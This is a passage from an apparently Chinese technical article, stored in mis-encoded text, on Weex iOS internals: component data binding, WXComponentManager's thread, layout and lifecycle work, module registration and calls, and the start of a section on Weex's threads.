<p>æ•°æ®ç»‘å®šçš„ã€Œå‰ç½®å‡†å¤‡ã€ï¼šåœ¨ç»„ä»¶åˆå§‹åŒ–æ—¶ï¼Œè§£æ JS ç«¯ä¼ é€’çš„ç»‘å®šè§„åˆ™ï¼ˆå¦‚ <code>[[user.name]]</code>ã€<code>[[repeat]]</code>ï¼‰ï¼Œç¼–è¯‘ä¸º Native å¯æ‰§è¡Œçš„ <code>WXDataBindingBlock</code>ï¼ˆä»£ç å—ï¼‰ï¼Œå¹¶å­˜å‚¨åˆ°ç»„ä»¶çš„ç»‘å®šæ˜ å°„è¡¨ä¸­ï¼ˆ<code>_bindingProps/_bindingStyles/_bindingEvents</code> ç­‰ï¼‰</p>
<pre><code class="hljs language-objective-c" lang="objective-c">- (void)_storeBindingsWithProps:(NSDictionary *)props styles:(NSDictionary *)styles attributes:(NSDictionary *)attributes events:(NSDictionary *)events;
</code></pre>
<p>æ¥æ”¶ç»„ä»¶çš„ props/attrbutes/styles/events ä¸­çš„ç»‘å®šè§„åˆ™ï¼Œè§£æå¹¶å­˜å‚¨ä¸ºå¯æ‰§è¡Œçš„ blockã€‚</p>
<ol>
<li><strong>è¯†åˆ«ç»‘å®šè¡¨è¾¾å¼</strong>ï¼šåˆ¤æ–­æ˜¯å¦åŒ…å« <code>WXBindingIdentify</code>ï¼ˆ<code>@"@binding"</code>ï¼‰æ ‡è®°ï¼Œæ¯”å¦‚ <code>{"src": {"@binding": "user.name"}}</code>ï¼›</li>
<li><strong>AST è§£æ</strong>ï¼šé€šè¿‡ <code>WXJSASTParser</code> æŠŠç»‘å®šè¡¨è¾¾å¼å­—ç¬¦ä¸²ï¼ˆå¦‚ <code>"user.name + 'åç¼€'"</code>ï¼‰è§£æä¸º AST èŠ‚ç‚¹ï¼ˆ<code>WXJSExpression</code>ï¼‰ï¼›</li>
<li><strong>ç”Ÿæˆæ‰§è¡Œ Block</strong>ï¼šè°ƒç”¨ <code>-bindingBlockWithExpression:</code> æŠŠ AST èŠ‚ç‚¹è½¬æˆ <code>WXDataBindingBlock</code>ï¼ˆåç»­æ•°æ®å˜åŒ–æ—¶ç›´æ¥æ‰§è¡Œè¯¥ Block è®¡ç®—ç»“æœï¼‰ï¼›</li>
<li>åˆ†ç±»å­˜å‚¨ï¼šæŒ‰ç»‘å®šç±»å‹ï¼ˆå±æ€§ / æ ·å¼ / äº‹ä»¶ / ç‰¹æ®Šç»‘å®šï¼‰å­˜å…¥å¯¹åº”çš„æ˜ å°„è¡¨ï¼š
<ul>
<li><code>_bindingProps</code>ï¼šå±æ€§ç»‘å®šï¼ˆå¦‚ <code>src</code>ï¼‰ï¼›</li>
<li><code>_bindingStyles</code>ï¼šæ ·å¼ç»‘å®šï¼ˆå¦‚ <code>fontSize</code>ï¼‰ï¼›</li>
<li><code>_bindingEvents</code>ï¼šäº‹ä»¶ç»‘å®šï¼ˆå¦‚ <code>onClick</code> å‚æ•°ï¼‰ï¼›</li>
<li>ç‰¹æ®Šç»‘å®šï¼š<code>_bindingRepeat</code>ï¼ˆ<code>[[repeat]]</code> å¯¹åº” <code>v-for</code>ï¼‰ã€<code>_bindingMatch</code>ï¼ˆ<code>[[match]]</code> å¯¹åº” <code>v-if</code>ï¼‰ã€<code>_dataBindOnce</code>ï¼ˆ<code>[[once]]</code> å¯¹åº” <code>v-once</code>ï¼‰ã€‚</li>
</ul>
</li>
</ol>
<h3 data-id="heading-24">2. WXComponentManager éƒ½åšäº†ä»€ä¹ˆ</h3>
<p><code>WXComponentManager</code> æ˜¯ Weex iOS ç«¯çš„ <strong>ç»„ä»¶å…¨ç”Ÿå‘½å‘¨æœŸä¸ä»»åŠ¡è°ƒåº¦æ ¸å¿ƒ</strong>ï¼Œæ‰€æœ‰ä¸ Native ç»„ä»¶ç›¸å…³çš„æ“ä½œï¼ˆåˆ›å»ºã€æ›´æ–°ã€å¸ƒå±€ã€é”€æ¯ã€äº‹ä»¶ç»‘å®šï¼‰éƒ½ç”±å®ƒç»Ÿä¸€ç®¡ç†ï¼ŒåŒæ—¶æ‰¿æ‹…ã€Œçº¿ç¨‹åˆ†å·¥åè°ƒã€UI ä»»åŠ¡æ‰¹é‡å¤„ç†ã€æ€§èƒ½ç›‘æ§ã€ç­‰å…³é”®èŒè´£ï¼Œæ˜¯è¿æ¥ JS æŒ‡ä»¤ã€Native ç»„ä»¶ã€å¸ƒå±€å¼•æ“å’Œ UI æ¸²æŸ“çš„ â€œä¸­æ¢å¤§è„‘â€ã€‚</p>
<h4 data-id="heading-25">1. ç»„ä»¶çº¿ç¨‹ç®¡ç†</h4>
<p>ç»„ä»¶ä¸šåŠ¡çš„ â€œä¸“å±æ‰§è¡Œç¯å¢ƒâ€ï¼Œä½œä¸ºç»„ä»¶çº¿ç¨‹çš„ã€Œåˆ›å»ºè€…å’Œç»´æŠ¤è€…ã€ï¼Œ<code>WXComponentManager</code> ç¡®ä¿æ‰€æœ‰ç»„ä»¶æ ¸å¿ƒæ“ä½œéƒ½åœ¨<strong>å…¨å±€å”¯ä¸€çš„ç»„ä»¶çº¿ç¨‹</strong>ä¸­æ‰§è¡Œï¼Œé¿å…çº¿ç¨‹å®‰å…¨é—®é¢˜å’Œä¸»çº¿ç¨‹é˜»å¡ã€‚</p>
<p>æ ¸å¿ƒå·¥ä½œï¼š</p>
<ul>
<li>æ‡’åŠ è½½åˆ›å»ºå…¨å±€ç»„ä»¶çº¿ç¨‹ï¼ˆ<code>+componentThread</code>ï¼‰ï¼Œå¯åŠ¨ RunLoop ç¡®ä¿çº¿ç¨‹å¸¸é©»ï¼ˆ<code>_runLoopThread</code>ï¼‰</li>
<li>æä¾›çº¿ç¨‹è°ƒåº¦æ¥å£ï¼š<code>WXPerformBlockOnComponentThread</code>ï¼ˆå¼‚æ­¥ï¼‰ã€<code>WXPerformBlockSyncOnComponentThread</code>ï¼ˆåŒæ­¥ï¼‰ï¼Œè®©å¤–éƒ¨æ¨¡å—ï¼ˆå¦‚ <code>WXBridgeManager</code>ï¼‰èƒ½å°†ç»„ä»¶ä»»åŠ¡æäº¤åˆ°ç»„ä»¶çº¿ç¨‹</li>
<li>çº¿ç¨‹æ–­è¨€çº¦æŸï¼šæ‰€æœ‰ç»„ä»¶æ ¸å¿ƒæ–¹æ³•ï¼ˆå¦‚ <code>createBody</code>ã€<code>updateStyles</code>ï¼‰å¼€å¤´éƒ½æœ‰ <code>WXAssertComponentThread</code>ï¼Œå¼ºåˆ¶ç»„ä»¶æ“ä½œåœ¨ç»„ä»¶çº¿ç¨‹æ‰§</li>
</ul>
<h4 data-id="heading-26">2. ç»„ä»¶æ ‘æ„å»ºä¸ç®¡ç†ï¼šç»„ä»¶çš„ â€œå¢åˆ æ”¹æŸ¥â€ å…¨ç”Ÿå‘½å‘¨æœŸ</h4>
<p>æ ¸å¿ƒå·¥ä½œï¼š</p>
<ul>
<li>åˆ›å»ºç»„ä»¶
<ul>
<li>æ ¹ç»„ä»¶åˆ›å»ºï¼ˆ<code>createBody:</code>ï¼‰ï¼šæ¥æ”¶ JS ç«¯æ ¹ç»„ä»¶æŒ‡ä»¤ï¼Œåˆ›å»ºé¡µé¢æ ¹ç»„ä»¶ï¼ˆå¦‚ <code>&lt;div&gt;</code> æ ¹èŠ‚ç‚¹ï¼‰ï¼Œç»‘å®šåˆ°é¡µé¢æ ¹è§†å›¾ï¼›</li>
<li>å­ç»„ä»¶åˆ›å»ºï¼ˆ<code>addComponent:type:parentRef:</code>ï¼‰ï¼šæ ¹æ® JS ç«¯æŒ‡ä»¤ï¼Œåˆ›å»ºå­ç»„ä»¶å¹¶å…³è”çˆ¶ç»„ä»¶ï¼Œå­˜å…¥ <code>_indexDict</code>ï¼ˆç»„ä»¶ ref â†’ å®ä¾‹æ˜ å°„ï¼Œå¿«é€ŸæŸ¥æ‰¾ï¼‰ã€‚</li>
</ul>
</li>
<li>æ›´æ–°ç»„ä»¶å…³ç³»
<ul>
<li>ç§»åŠ¨ç»„ä»¶ï¼ˆ<code>moveComponent:toSuper:atIndex:</code>ï¼‰ï¼šè°ƒæ•´ç»„ä»¶åœ¨ç»„ä»¶æ ‘ä¸­çš„ä½ç½®ï¼ŒåŒæ­¥æ›´æ–°è§†å›¾å±‚çº§ï¼›</li>
<li>åˆ é™¤ç»„ä»¶ï¼ˆ<code>removeComponent:</code>ï¼‰ï¼šä»ç»„ä»¶æ ‘å’Œç´¢å¼•å­—å…¸ä¸­ç§»é™¤ç»„ä»¶ï¼Œé€’å½’åˆ é™¤å­ç»„ä»¶ï¼Œé‡Šæ”¾è§†å›¾èµ„æºã€‚</li>
</ul>
</li>
<li>ç»„ä»¶æŸ¥è¯¢ä¸éå†
<ul>
<li>æŒ‰ ref æŸ¥æ‰¾ç»„ä»¶ï¼ˆ<code>componentForRef:</code>ï¼‰ï¼šä¾› JS ç«¯ <code>this.$refs</code> è®¿é—®åŸç”Ÿç»„ä»¶å®ä¾‹ï¼›</li>
<li>éå†ç»„ä»¶æ ‘ï¼ˆ<code>enumerateComponentsUsingBlock:</code>ï¼‰ï¼šæ”¯æŒé€’å½’éå†æ‰€æœ‰ç»„ä»¶ï¼ˆå¦‚æ€§èƒ½ç»Ÿè®¡ã€å…¨å±€æ ·å¼æ›´æ–°ï¼‰</li>
</ul>
</li>
</ul>
<h4 data-id="heading-27">3.  æ•°æ®ç»‘å®šè¾…åŠ©ï¼šç»‘å®šè§„åˆ™çš„æå–ä¸å­˜å‚¨</h4>
<p>é…åˆ <code>WXComponent+DataBinding</code> æ¨¡å—ï¼Œ<code>WXComponentManager</code> åœ¨ç»„ä»¶åˆ›å»ºæ—¶ï¼Œä» JS ç«¯ä¼ é€’çš„ <code>props</code>/<code>styles</code>/<code>attributes</code> ä¸­æå–ã€Œç»‘å®šè¡¨è¾¾å¼é…ç½®ã€ï¼Œä¸ºå“åº”å¼æ›´æ–°é“ºè·¯ã€‚æ ¸å¿ƒå·¥ä½œï¼š</p>
<ul>
<li>æå–ç»‘å®šè§„åˆ™ï¼š
<ul>
<li><code>_extractBindings:</code>ï¼šä»æ ·å¼ / å±æ€§ä¸­æå– <code>[[repeat]]</code>/<code>{"@binding": "expr"}</code> ç­‰ç»‘å®šé…ç½®ï¼Œç§»é™¤åŸå§‹å­—å…¸ä¸­çš„ç»‘å®šå­—æ®µï¼ˆé¿å…å¹²æ‰°æ™®é€šå±æ€§å¤„ç†ï¼‰</li>
<li><code>_extractBindingEvents:</code>ï¼šä»äº‹ä»¶æ•°ç»„ä¸­æå–ç»‘å®šå‚æ•°ï¼ˆå¦‚ <code>onClick</code> çš„å›è°ƒè¡¨è¾¾å¼ï¼‰ï¼›</li>
<li><code>_extractBindingProps:</code>ï¼šæå–ç»„ä»¶è‡ªå®šä¹‰ props ç»‘å®šï¼ˆ<code>@componentProps</code>ï¼‰ã€‚</li>
</ul>
</li>
<li>å­˜å‚¨ç»‘å®šè§„åˆ™ï¼šè°ƒç”¨ç»„ä»¶çš„ <code>_storeBindingsWithProps:styles:attributes:events:</code>ï¼Œå°†æå–çš„ç»‘å®šé…ç½®å­˜å…¥ç»„ä»¶å®ä¾‹ï¼Œåç»­æ•°æ®å˜åŒ–æ—¶è§¦å‘è¡¨è¾¾å¼è®¡ç®—ã€‚</li>
</ul>
<h4 data-id="heading-28">4. ç»„ä»¶æ›´æ–°è°ƒåº¦ï¼šæ ·å¼ / å±æ€§ / äº‹ä»¶çš„ â€œåŒæ­¥ä¸æ‰§è¡Œâ€</h4>
<p>å½“ JS ç«¯è§¦å‘ç»„ä»¶æ›´æ–°ï¼ˆå¦‚ä¿®æ”¹æ ·å¼ã€å±æ€§ã€ç»‘å®šäº‹ä»¶ï¼‰æ—¶ï¼Œ<code>WXComponentManager</code> è´Ÿè´£ã€Œè·¨çº¿ç¨‹è°ƒåº¦ã€æ•°æ®é¢„å¤„ç†ã€UI åŒæ­¥ã€ï¼Œç¡®ä¿æ›´æ–°æµç¨‹é«˜æ•ˆä¸”å®‰å…¨ã€‚</p>
<ul>
<li>æ ·å¼æ›´æ–°ï¼ˆ<code>updateStyles:forComponent:</code>ï¼‰
<ul>
<li>ç»„ä»¶çº¿ç¨‹ï¼šè¿‡æ»¤æ— æ•ˆæ ·å¼ï¼ˆå¦‚ç©ºå€¼ï¼‰ï¼Œæ›´æ–°ç»„ä»¶å®ä¾‹çš„æ ·å¼æ•°æ®ï¼Œè§¦å‘å¸ƒå±€è®¡ç®—ï¼›</li>
<li>ä¸»çº¿ç¨‹ï¼šé€šè¿‡ <code>_addUITask</code> å°†æ ·å¼æ›´æ–°ä»»åŠ¡ï¼ˆå¦‚è®¾ç½® <code>CALayer.backgroundColor</code>ã€<code>UILabel.font</code>ï¼‰æ‰¹é‡è°ƒåº¦åˆ°ä¸»çº¿ç¨‹æ‰§è¡Œã€‚</li>
</ul>
</li>
<li><strong>å±æ€§æ›´æ–°ï¼ˆ<code>updateAttributes:forComponent:</code>ï¼‰</strong>ï¼šç±»ä¼¼æ ·å¼æ›´æ–°ï¼Œç»„ä»¶çº¿ç¨‹å¤„ç†æ•°æ®é€»è¾‘ï¼Œä¸»çº¿ç¨‹æ›´æ–°åŸç”Ÿç»„ä»¶å±æ€§ï¼ˆå¦‚ <code>UIImageView.image</code>ã€<code>UIScrollView.contentOffset</code>ï¼‰ã€‚</li>
<li>äº‹ä»¶ç»‘å®š / è§£ç»‘
<ul>
<li>ç»„ä»¶çº¿ç¨‹ï¼šç»´æŠ¤ç»„ä»¶çš„äº‹ä»¶åˆ—è¡¨ï¼ˆå¦‚ <code>click</code>/<code>scroll</code>ï¼‰ï¼›</li>
<li>ä¸»çº¿ç¨‹ï¼šç»‘å®š / ç§»é™¤åŸç”Ÿæ‰‹åŠ¿è¯†åˆ«å™¨ï¼ˆå¦‚ <code>UITapGestureRecognizer</code>ï¼‰ï¼Œæ•è·ç”¨æˆ·äº¤äº’ã€‚</li>
</ul>
</li>
<li><strong>æ‰¹é‡æ›´æ–°ä¼˜åŒ–</strong>ï¼šé€šè¿‡ <code>performBatchBegin</code>/<code>performBatchEnd</code> æ ‡è®°æ‰¹é‡æ›´æ–°èŒƒå›´ï¼Œåˆå¹¶å¤šä¸ª UI ä»»åŠ¡ï¼Œå‡å°‘ä¸»çº¿ç¨‹è°ƒåº¦æ¬¡æ•°ï¼ˆæå‡æ€§èƒ½ï¼‰ã€‚</li>
</ul>
<h4 data-id="heading-29">5. å¸ƒå±€è°ƒåº¦ä¸ UI åŒæ­¥ï¼šä»å¸ƒå±€è®¡ç®—åˆ° UI æ¸²æŸ“</h4>
<p>Weex é‡‡ç”¨ Flex å¸ƒå±€å¼•æ“ï¼ˆYogaï¼‰ï¼Œ<code>WXComponentManager</code> è´Ÿè´£å¸ƒå±€è®¡ç®—çš„è§¦å‘ã€ç»„ä»¶ frame åˆ†é…ã€UI ä»»åŠ¡æ‰¹é‡æ‰§è¡Œï¼Œç¡®ä¿ç»„ä»¶æŒ‰é¢„æœŸä½ç½®æ¸²æŸ“ã€‚</p>
<ul>
<li>è§¦å‘å¸ƒå±€è®¡ç®—ï¼šç»„ä»¶æ›´æ–°ã€æ ¹è§†å›¾å°ºå¯¸å˜åŒ–ï¼ˆ<code>rootViewFrameDidChange:</code>ï¼‰æ—¶ï¼Œè°ƒç”¨ <code>_layoutAndSyncUI</code> è§¦å‘ <code>WXCoreBridge</code> æ‰§è¡Œ Yoga å¸ƒå±€è®¡ç®—ï¼Œå¾—åˆ°æ‰€æœ‰ç»„ä»¶çš„ frameã€‚</li>
<li>åˆ†é…ç»„ä»¶ frameï¼š<code>layoutComponent:frame:isRTL:innerMainSize:</code> å°†è®¡ç®—åçš„ frame åˆ†é…ç»™ç»„ä»¶ï¼Œè‹¥ä¸ºæ ¹ç»„ä»¶ï¼ŒåŒæ­¥æ›´æ–°é¡µé¢æ ¹è§†å›¾å°ºå¯¸ï¼ˆé€‚é… <code>wrap_content</code> æ¨¡å¼ï¼‰ã€‚</li>
<li>UI ä»»åŠ¡åŒæ­¥ï¼š<code>_syncUITasks</code> æ‰¹é‡æ‰§è¡Œ <code>_uiTaskQueue</code> ä¸­çš„ UI ä»»åŠ¡ï¼ˆå¦‚ <code>addSubview</code>ã€<code>setFrame</code>ï¼‰ï¼Œå¼‚æ­¥è°ƒåº¦åˆ°ä¸»çº¿ç¨‹ï¼Œé¿å…é¢‘ç¹ä¸»çº¿ç¨‹åˆ‡æ¢å¯¼è‡´æ‰å¸§ã€‚</li>
<li>å¸§ç‡åŒæ­¥ï¼šé€šè¿‡ <code>WXDisplayLinkManager</code> ç›‘å¬å±å¹•åˆ·æ–°ç‡ï¼ˆ60fpsï¼‰ï¼Œç¡®ä¿å¸ƒå±€æ›´æ–°ä¸å¸§ç‡åŒæ­¥ï¼Œæå‡æ¸²æŸ“æµç•…åº¦ã€‚</li>
</ul>
<h4 data-id="heading-30">6. ç”Ÿå‘½å‘¨æœŸä¸èµ„æºé‡Šæ”¾ï¼šé¡µé¢å¸è½½æ—¶çš„ â€œæ¸…ç†å·¥ä½œâ€</h4>
<p>å½“ Weex é¡µé¢é”€æ¯ï¼ˆ<code>WXSDKInstance</code> å¸è½½ï¼‰æ—¶ï¼Œ<code>WXComponentManager</code> è´Ÿè´£æ¸…ç†ç»„ä»¶èµ„æºï¼Œé¿å…å†…å­˜æ³„æ¼ã€‚</p>
<p>æ ¸å¿ƒå·¥ä½œï¼ˆ<code>unload</code> æ–¹æ³•ï¼‰ï¼š</p>
<ul>
<li>åœæ­¢å¸ƒå±€è°ƒåº¦ï¼šè°ƒç”¨ <code>_stopDisplayLink</code>ï¼Œåœæ­¢å¸§ç‡ç›‘å¬å’Œå¸ƒå±€è®¡ç®—ï¼›</li>
<li>è§£ç»‘æ¸²æŸ“èµ„æºï¼šéå†æ‰€æœ‰ç»„ä»¶ï¼Œè§£é™¤ä¸åº•å±‚æ¸²æŸ“å¯¹è±¡ï¼ˆ<code>RenderObject</code>ï¼‰çš„ç»‘å®šï¼›</li>
<li>é‡Šæ”¾ UI èµ„æºï¼šè°ƒåº¦åˆ°ä¸»çº¿ç¨‹ï¼Œé”€æ¯æ‰€æœ‰ç»„ä»¶çš„åŸç”Ÿè§†å›¾ï¼ˆ<code>_unloadViewWithReusing:</code>ï¼‰ï¼›</li>
<li>æ¸…ç©ºçŠ¶æ€ï¼šæ¸…ç©º <code>_indexDict</code>ã€<code>_uiTaskQueue</code>ã€<code>_fixedComponents</code> ç­‰å®¹å™¨ï¼Œè§£é™¤ä¸ <code>WXSDKInstance</code>çš„ç»‘å®šã€‚</li>
<li>æ¸…é™¤äº‹ä»¶ç»‘å®šï¼šæ¸…é™¤æ‰€æœ‰çš„äº‹ä»¶ã€æ‰‹åŠ¿ç­‰é€»è¾‘</li>
</ul>
<h2 data-id="heading-31">ä¸ƒã€WXModule çš„æ³¨å†Œæœºåˆ¶åŠå…¶è°ƒç”¨æµç¨‹</h2>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant JS as JSç¯å¢ƒ
    participant B as WXBridge
    participant MF as WXModuleFactory
    participant MM as WXModuleManager
    participant MI as Moduleå®ä¾‹
    participant MC as è‡ªå®šä¹‰Module

    Note over JS,MC: æ³¨å†Œé˜¶æ®µ
    MC-&gt;&gt;+MF: registerModule("customModule", MyModule.class)
    MF-&gt;&gt;MF: ç”ŸæˆModuleFactoryå¹¶ç¼“å­˜
    MF-&gt;&gt;MF: åå°„è§£æ@JSMethodæ–¹æ³•
    MF-&gt;&gt;B: å°†æ¨¡å—&amp;æ–¹æ³•ä¿¡æ¯ä¼ é€’ç»™JS

    Note over JS,MC: è°ƒç”¨é˜¶æ®µ
    JS-&gt;&gt;+B: weex.requireModule('customModule').myMethod(args)
    B-&gt;&gt;+MM: è°ƒç”¨ invokeModuleMethod
    MM-&gt;&gt;+MF: è·å–Moduleå®ä¾‹å’Œæ–¹æ³•Invoker
    MF-&gt;&gt;MF: æŸ¥æ‰¾/åˆ›å»ºModuleå®ä¾‹
    MF-&gt;&gt;MF: è·å–æ–¹æ³•Invoker
    MF-&gt;&gt;MM: è¿”å›å®ä¾‹å’ŒInvoker
    MM-&gt;&gt;+MI: é€šè¿‡Invoker.invokeè°ƒç”¨
    MI-&gt;&gt;+MC: æ‰§è¡ŒåŸç”Ÿæ–¹æ³•å®ç°
    MC-&gt;&gt;JS: é€šè¿‡callbackå›è°ƒJSï¼ˆå¯é€‰ï¼‰
</code></pre>
<h3 data-id="heading-32">1. WXModule çš„æ³¨å†Œåˆ†ä¸º Naitve æ³¨å†Œå’Œ JS æ³¨å†Œ</h3>
<ul>
<li><strong>Native æ³¨å†Œ</strong>ï¼šåœ¨ Native ç«¯ï¼Œè°ƒç”¨ <code>[WXSDKEngine registerModule:withClass:]</code> æ–¹æ³•ï¼ˆåœ¨ iOS ä¸­ï¼‰ ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šå°†è‡ªå®šä¹‰ Module çš„ç±»å’Œä¸€ä¸ªæ¨¡å—åç§°ï¼ˆä¾‹å¦‚ <code>TestModule</code>ï¼‰å»ºç«‹æ˜ å°„å…³ç³»ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ª <code>ModuleFactory</code> å­˜å‚¨åœ¨ä¸€ä¸ªå…¨å±€çš„ Mapï¼ˆä¾‹å¦‚ <code>sModuleFactoryMap</code>ï¼‰ä¸­ã€‚åŒæ—¶ï¼Œå¦‚æœè¯¥ Module è¢«æ ‡è®°ä¸ºå…¨å±€ï¼ˆglobalï¼‰ï¼ŒSDK ä¼šç«‹å³åˆ›å»ºä¸€ä¸ªå®ä¾‹å¹¶ç¼“å­˜èµ·æ¥ã€‚</li>
<li><strong>JS æ³¨å†Œ</strong>ï¼šNative æ³¨å†Œå®Œæˆåï¼ŒWeex ä¼šå°†æ‰€æœ‰å·²æ³¨å†Œ Module çš„<strong>æ¨¡å—åç§°</strong>åŠå…¶<strong>æš´éœ²ç»™ JS çš„æ–¹æ³•ååˆ—è¡¨</strong>ï¼Œé€šè¿‡ <code>WXBridge</code>ï¼ˆJS-Native é€šä¿¡æ¡¥æ¢ï¼‰ä¼ é€’ç»™ JS å¼•æ“ã€‚è¿™æ ·ï¼ŒJS ç«¯å°±çŸ¥é“å­˜åœ¨å“ªäº›æ¨¡å—ä»¥åŠæ¯ä¸ªæ¨¡å—æœ‰å“ªäº›æ–¹æ³•å¯ä»¥è°ƒç”¨ã€‚</li>
</ul>
<h3 data-id="heading-33">2. å½“ JS è°ƒç”¨ Module æ–¹æ³•æ—¶</h3>
<ul>
<li>JS å‘èµ·è°ƒç”¨ï¼šåœ¨ JS ä»£ç ä¸­ï¼Œé€šè¿‡ <code>weex.requireModule('moduleName')</code> è·å–æ¨¡å—å®ä¾‹ ã€‚ç„¶ååŠå½±å…¶æ–¹æ³•ï¼Œæ¯”å¦‚ 'staream.fetch()options, callack)'</li>
<li>Bridge æ¡¥æ¥ï¼šJS å¼•æ“é€šè¿‡ JSBridge å°†è¿™æ¬¡è°ƒç”¨ï¼ˆåŒ…æ‹¬æ¨¡å—åã€æ–¹æ³•åã€å‚æ•°ç­‰ä¿¡æ¯ï¼‰ä¼ é€’ç»™ Native æ®µ</li>
<li>Native ç«¯æŸ¥æ‰¾ä¸æ‰§è¡Œï¼šNative ç«¯çš„ WXModuleManager æ ¹æ®æ¨¡å—åä»ä¹‹å‰æ³¨å†Œçš„å·¥å‚ä¸­è·å–åˆ›å»ºçš„ Module å®ä¾‹ï¼Œå¹¶æ ¹æ®æ–¹æ³•åæ‰¾åˆ°å¯¹åº”çš„ MethodInvokerã€‚MethodInvoker ä¼šé€šè¿‡åå°„æ‰‹æ®µè°ƒç”¨å…·ä½“çš„ Native æ–¹æ³•</li>
<li>ç»“æœå›è°ƒï¼šå¦‚æœæœ‰éœ€è¦ï¼ŒNative å¯ä»¥é€šè¿‡ WXModuleCallBack æˆ–è€… WXModuleKeepAliveCallBack å°†ç»“æœå›è°ƒç»™ JSã€‚WXModuleCallback åªèƒ½å›è°ƒ1æ¬¡ï¼Œè€Œ WXModuleKeepAliveCallback å¯ä»¥å¤šæ¬¡å›è°ƒ</li>
</ul>
<h3 data-id="heading-34">3. WXModuleProtocol çš„ä½œç”¨</h3>
<p><strong><code>WXModuleProtocol</code> æ˜¯ä¸€ä¸ªåè®®ï¼Œå®šä¹‰äº† Module çš„è¡Œä¸ºè§„èŒƒ</strong>ã€‚ä½ çš„è‡ªå®šä¹‰ Module å¿…é¡»éµå¾ªæ­¤åè®®ã€‚å®ƒå£°æ˜äº† Module éœ€è¦å®ç°çš„æ–¹æ³•æˆ–å±æ€§ï¼Œä¾‹å¦‚å¦‚ä½•æš´éœ²æ–¹æ³•ç»™ JSï¼ˆé€šè¿‡ <code>WX_EXPORT_METHOD</code> å®ï¼‰ã€æ–¹æ³•åœ¨å“ªä¸ªçº¿ç¨‹æ‰§è¡Œï¼ˆé€šè¿‡å®ç°ç‰¹å®šçš„æ–¹æ³•è¿”å›ç›®æ ‡çº¿ç¨‹ï¼Œä¾‹å¦‚ <code>targetExecuteThread</code>ï¼‰ã€ä»¥åŠå¦‚ä½•é€šè¿‡ <code>weexInstance</code> å±æ€§å¼±å¼•ç”¨æŒæœ‰å®ƒçš„ WXSDKInstance å®ä¾‹ã€‚
é€šè¿‡éµå¾ª <code>WXModuleProtocol</code>ï¼Œä½ è‡ªå®šä¹‰çš„ Module å°±èƒ½è¢« Weex SDK æ­£ç¡®è¯†åˆ«å’Œè°ƒ</p>
<h3 data-id="heading-35">4. WXModuleFactory çš„ä½œç”¨</h3>
<ol>
<li><strong>å­˜å‚¨é…ç½®</strong>ï¼šåœ¨æ³¨å†Œé˜¶æ®µï¼Œå®ƒä¼šç¼“å­˜ Module çš„é…ç½®ä¿¡æ¯ï¼Œä¾‹å¦‚æ¨¡å—åå’Œå¯¹åº”çš„å·¥å‚ç±»ï¼ˆ<code>WXModuleConfig</code>ï¼‰ã€‚</li>
<li><strong>æ–¹æ³•è§£æ</strong>ï¼šé€šè¿‡åå°„ï¼Œè§£æ Module ç±»ä¸­æ‰€æœ‰é€šè¿‡ <code>WX_EXPORT_METHOD</code> æˆ– <code>WX_EXPORT_METHOD_SYNC</code> å®æš´éœ²çš„æ–¹æ³•ï¼Œå¹¶ç”Ÿæˆæ–¹æ³•åä¸ <code>MethodInvoker</code>ï¼ˆå°è£…äº†åå°„è°ƒç”¨é€»è¾‘ï¼‰çš„æ˜ å°„å…³ç³»ã€‚</li>
<li>æä¾›å®ä¾‹ï¼šå½“ JS è°ƒç”¨ Module æ–¹æ³•æ—¶ï¼Œ<code>WXModuleManager</code> ä¼šé€šè¿‡ <code>WXModuleFactory</code> æ ¹æ®æ¨¡å—åè·å–æˆ–åˆ›å»º Module å®ä¾‹ï¼Œä»¥åŠå¯¹åº”æ–¹æ³•çš„ <code>MethodInvoker</code>ã€‚</li>
</ol>
<h2 data-id="heading-36">å…«ã€Weex åˆ†ä¸ºå‡ ä¸ªçº¿ç¨‹</h2>
<h3 data-id="heading-37">1. ä¸»çº¿ç¨‹</h3>
<p>æ ¸å¿ƒå®šä½ï¼šåº”ç”¨çš„ UI çº¿ç¨‹ï¼ˆä¸åŸç”Ÿ App ä¸»çº¿ç¨‹åŒæºï¼‰ï¼Œè´Ÿè´£ UI æ¸²æŸ“ã€ç”¨æˆ·äº¤äº’å“åº”ï¼Œ<strong>ç¦æ­¢è€—æ—¶æ“ä½œ</strong>ã€‚</p>
<p>æ ¸å¿ƒèŒè´£ï¼š</p>
<ul>
<li>æ‰¿è½½ Weex é¡µé¢çš„ <strong>åŸç”Ÿæ¸²æŸ“å®¹å™¨</strong>ï¼ˆå¦‚ Android çš„ <code>WXFrameLayout</code>ã€iOS çš„ <code>WXSDKInstanceView</code>ï¼‰ï¼Œæ‰§è¡Œè§†å›¾å¸ƒå±€ã€ç»˜åˆ¶ã€åŠ¨ç”»è§¦å‘ï¼›</li>
<li>å¤„ç†ç”¨æˆ·äº¤äº’äº‹ä»¶ï¼ˆç‚¹å‡»ã€æ»‘åŠ¨ã€è¾“å…¥ç­‰ï¼‰ï¼Œå¹¶å°†äº‹ä»¶è½¬å‘ç»™ JS çº¿ç¨‹ï¼ˆå¦‚éœ€è¦ JS é€»è¾‘å“åº”æ—¶ï¼‰ï¼›</li>
<li>æ‰§è¡ŒåŸç”Ÿæ¨¡å—çš„ <strong>ä¸»çº¿ç¨‹æ–¹æ³•</strong>ï¼ˆé€šè¿‡ <code>@WXModuleAnnotation(runOnUIThread = true)</code> æ ‡è®°çš„æ–¹æ³•ï¼Œå¦‚å¼¹ Toastã€æ›´æ–° UI çš„åŸç”Ÿèƒ½åŠ›ï¼‰ï¼›</li>
<li>æ¥æ”¶ JS çº¿ç¨‹ä¸‹å‘çš„ <strong>UI æ“ä½œæŒ‡ä»¤</strong>ï¼ˆå¦‚åˆ›å»ºè§†å›¾ã€ä¿®æ”¹æ ·å¼ã€æ›´æ–°å±æ€§ï¼‰ï¼Œå¹¶æ˜ å°„ä¸ºåŸç”Ÿè§†å›¾æ“ä½œï¼›</li>
</ul>
<p><strong>å…³é”®çº¦æŸ</strong>ï¼šæ‰€æœ‰ç›´æ¥æ“ä½œåŸç”Ÿè§†å›¾çš„é€»è¾‘å¿…é¡»åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œï¼Œå¦åˆ™ä¼šå¯¼è‡´ UI é”™ä¹±æˆ–å´©æºƒ</p>
<h3 data-id="heading-38">2. JS çº¿ç¨‹</h3>
